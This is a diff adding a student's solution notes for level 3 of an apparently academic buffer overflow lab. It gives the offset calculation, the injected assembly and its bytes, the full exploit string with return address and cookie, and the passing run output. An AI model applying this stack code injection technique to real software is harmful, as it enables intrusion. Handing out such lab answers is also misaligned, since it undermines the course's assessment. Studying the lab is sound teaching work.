@@ -1,0 +1,63 @@
+// Beware! avoid using comments in the attack code! if you forget a space before or after the "/*" the comment will be treated as part of the buffer!
+
+
+//The total bytes before the cookie are: buffer + 8 bytes for return address of rsp + 8 bytes for touch3
+56+8+8=72 (0x48 hex)
+
+//rsp address from phase 2:
+0x5562b0a8
+//a8 b0 62 55
+
+//rsp+0x48=0x5562b0a8+0x48=0x5562B0F0
+
+
+u2 israele4 43 : cd SP2/target8888
+
+"
+movq $0x5562B0F0,%rdi /* %rsp+0x48(address of the cookie string to %rdi(the first argument to a function is passed in register %rdi)  */
+retq
+"
+
+u2 israele4 46 : gcc -c phase3helpcode.s
+u2 israele4 47 : objdump -d phase3helpcode.o  > phase3helpcode.d
+
+"
+0000000000000000 <.text>:
+   0:	48 c7 c7 f0 b0 62 55 	mov    $0x5562b0f0,%rdi
+   7:	c3                   	retq   
+
+"
+
+
+48 c7 c7 f0 b0 62 55 c3 /* %rsp+0x48(address of the cookie string to %rdi(the first argument to a function is passed in register %rdi) then ret */
+00 00 00 00 00 00 00 00 /* the rest of the padding - 48 bytes. 0x38 bytes = 56 bytes, subtructing 8 bytes that already occupied by the cookie */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+a8 b0 62 55 00 00 00 00 /* address of %rsp register in little endian (return address) */
+c6 17 40 00 00 00 00 00 /* touch3 address from rtarget dump file */
+34 66 33 66 66 33 64 31 /* cookie string */
+
+
+
+u2 israele4 48 : ./hex2raw < phase3sol.txt > phase3rawfinal.txt
+u2 israele4 49 : ./ctarget < phase3rawfinal.txt
+Cookie: 0x4f3ff3d1
+Type string:Touch3!: You called touch3("4f3ff3d1")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
+
+
+
+
+
+
+
+
+
+
+
